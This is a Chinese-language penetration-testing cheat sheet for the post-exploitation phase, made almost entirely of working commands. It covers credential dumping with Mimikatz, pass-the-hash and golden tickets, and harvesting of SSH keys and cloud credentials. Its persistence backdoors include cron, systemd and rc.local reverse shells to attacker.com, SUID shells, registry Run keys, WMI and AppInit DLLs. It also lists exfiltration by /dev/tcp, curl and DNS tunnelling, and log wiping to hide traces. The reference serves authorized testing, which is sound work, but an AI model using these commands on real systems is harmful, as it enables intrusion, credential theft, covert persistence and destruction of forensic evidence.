# Phase 6: 后渗透

> **PTES 对应阶段**: 后渗透 (Post Exploitation)
> > **MITRE ATT&CK**: Persistence [TA0003], Collection [TA0009], Exfiltration [TA0010]

## 信息收集

### 系统信息

**Linux**
```bash
# 基础信息
cat /etc/os-release
uname -a
hostname
id
whoami

# 用户和组
cat /etc/passwd | grep sh$
cat /etc/group
cat /etc/sudoers 2>/dev/null

# 历史命令
cat ~/.bash_history
cat ~/.zsh_history
find / -name ".*_history" 2>/dev/null
```

**Windows**
```powershell
# 系统信息
systeminfo
whoami /all

# 用户和组
net user
net localgroup administrators
net group "Domain Admins" /domain

# PowerShell历史
type C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### 网络信息

**Linux**
```bash
ip addr
ip route
cat /etc/resolv.conf
netstat -tulpn
ss -tulpn
arp -a
iptables -L
```

**Windows**
```powershell
ipconfig /all
route print
netstat -ano
arp -a
Get-NetFirewallRule
```

### 敏感文件搜索

**Linux**
```bash
# 配置文件
find / -name "*.conf" -o -name "*.config" 2>/dev/null
find /etc -type f \( -name "*.conf" -o -name "*.cfg" \) 2>/dev/null

# 密钥文件
find / -name "*.pem" -o -name "*.key" 2>/dev/null
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
find /home -name "*.ssh" -type d 2>/dev/null

# 数据库文件
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sql" 2>/dev/null

# 日志文件
cat /var/log/auth.log
cat /var/log/syslog
cat /var/log/apache2/access.log
cat /var/log/nginx/access.log
```

**Windows**
```powershell
# 搜索敏感文件
dir /s *pass* == *cred* == *vnc* == *.config 2>$nul
findstr /si password *.txt *.xml *.ini

# 注册表凭证
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# IIS配置
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

## 凭证收集

### Windows凭证提取

**Mimikatz**
```
# 基础用法
privilege::debug
token::elevate

# 提取凭证
sekurlsa::logonpasswords        # 内存凭证
lsadump::sam                    # SAM数据库
lsadump::secrets                # LSA Secrets
lsadump::cache                  # 缓存凭证

# 提取票据
sekurlsa::tickets /export
kerberos::list

# Pass-the-Hash
sekurlsa::pth /user:admin /domain:target.com /ntlm:hash

# Golden Ticket
kerberos::golden /user:admin /domain:target.com /sid:S-1-5-21-... /krbtgt:hash /id:500
```

**LaZagne**
```bash
# 全平台凭证提取
python lazagne.py all
python lazagne.py browsers
python lazagne.py windows
```

**SharpDPAPI**
```powershell
# 解密DPAPI保护的凭证
SharpDPAPI.exe triage
SharpDPAPI.exe credentials
```

### 浏览器凭证

**Linux**
```bash
# Chrome
ls ~/.config/google-chrome/Default/Login\ Data
# 使用: https://github.com/ohmybahgosh/RockYouTube

# Firefox
ls ~/.mozilla/firefox/*/logins.json
ls ~/.mozilla/firefox/*/key4.db
```

**Windows**
```powershell
# Chrome
$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data

# Firefox
$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json
```

### 云凭证

**AWS**
```bash
# 常见位置
~/.aws/credentials
~/.aws/config
/var/www/.aws/credentials
/home/*/.aws/credentials

# 环境变量
env | grep AWS
```

**Azure**
```bash
# 常见位置
~/.azure/
/var/lib/waagent/
```

**GCP**
```bash
# 常见位置
~/.config/gcloud/credentials.db
~/.config/gcloud/legacy_credentials/
```

## 持久化

### Linux持久化

**1. SSH密钥**
```bash
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

**2. 计划任务 (Cron)**
```bash
# 当前用户
crontab -e
# */5 * * * * nc -e /bin/sh attacker.com 4444

# 系统级
echo "*/5 * * * * root nc -e /bin/sh attacker.com 4444" >> /etc/crontab
```

**3. 系统服务**
```bash
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=Backdoor

[Service]
Type=simple
ExecStart=/bin/nc -e /bin/sh attacker.com 4444
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor
systemctl start backdoor
```

**4. SUID后门**
```bash
cp /bin/bash /tmp/.hidden_shell
chmod u+s /tmp/.hidden_shell
# 执行: /tmp/.hidden_shell -p
```

**5. 启动脚本**
```bash
# /etc/rc.local
echo "/bin/nc -e /bin/sh attacker.com 4444" >> /etc/rc.local

# /etc/init.d/
# /etc/profile.d/
```

**6. PAM后门**
```bash
# 修改 /etc/pam.d/common-auth
# 添加后门密码
```

### Windows持久化

**1. 注册表Run键**
```cmd
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
```

**2. 计划任务**
```cmd
schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc minute /mo 5
schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc onlogon
```

**3. 服务**
```cmd
sc create Backdoor binPath= "C:\backdoor.exe" start= auto
sc start Backdoor
```

**4. WMI事件订阅**
```powershell
# 持久化WMI事件
$FilterArgs = @{name='Backdoor'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"}
$Filter = New-CimInstance @FilterArgs -Namespace root/subscription -ClassName __EventFilter

$ConsumerArgs = @{name='Backdoor'; CommandLineTemplate='C:\backdoor.exe'}
$Consumer = New-CimInstance @ConsumerArgs -Namespace root/subscription -ClassName CommandLineEventConsumer

$FilterToConsumerArgs = @{Filter=$Filter; Consumer=$Consumer}
$FilterToConsumerBinding = New-CimInstance @FilterToConsumerArgs -Namespace root/subscription -ClassName __FilterToConsumerBinding
```

**5. 启动文件夹**
```powershell
# 用户级
$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\

# 系统级
$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\StartUp\
```

**6. DLL劫持**
```powershell
# 找到程序加载的DLL
# 替换为恶意DLL
# 或使用 AppInit_DLLs
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\malicious.dll" /f
```

## 数据提取 (Exfiltration)

### 文件传输

**攻击机准备**
```bash
# Netcat
nc -lvnp 4444 > file.txt

# Python HTTP
python3 -m http.server 8080

# PHP内置服务器
php -S 0.0.0.0:8080
```

**目标机发送**
```bash
# 基础传输
cat file.txt > /dev/tcp/attacker.com/4444
curl -F "file=@file.txt" http://attacker.com/upload
wget --post-file=file.txt http://attacker.com/upload

# 分卷传输
split -b 10M file.txt file.part-
for f in file.part-*; do curl -F "file=@$f" http://attacker.com/upload; done
```

**DNS隧道**
```bash
# 数据编码
cat file.txt | xxd -p | while read line; do nslookup "$line.attacker.com"; done

# 工具: iodine, dnscat2, dns2tcp
```

### 压缩与加密

```bash
# 压缩
zip -r data.zip /path/to/data
tar -czvf data.tar.gz /path/to/data

# 加密
gpg -c data.zip
openssl enc -aes-256-cbc -salt -in data.zip -out data.zip.enc -k password
```

### 数据库导出

```bash
# MySQL
mysqldump -u root -p database > backup.sql

# PostgreSQL
pg_dump -U postgres database > backup.sql

# MongoDB
mongodump --out /backup/
```

## 痕迹清理

### Linux

```bash
# 清除历史
history -c
rm ~/.bash_history
cat /dev/null > ~/.bash_history

# 清除日志
shred -zu /var/log/auth.log
shred -zu /var/log/syslog
# 或使用: shred -n 35 -z -u file

# 修改时间戳
touch -r /bin/ls /backdoor

# 安全删除
shred -zu file.txt
rm -P file.txt  # BSD/macOS
```

### Windows

```powershell
# 清除事件日志
wevtutil el | Foreach-Object {wevtutil cl "$_."}

# 清除PowerShell历史
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath

# 清除最近文件
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force

# ShimCache清理
# 需要重启或使用工具
```

## 参考资源

- [MITRE ATT&CK - Persistence](https://attack.mitre.org/tactics/TA0003/)
- [PayloadsAllTheThings - Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md)
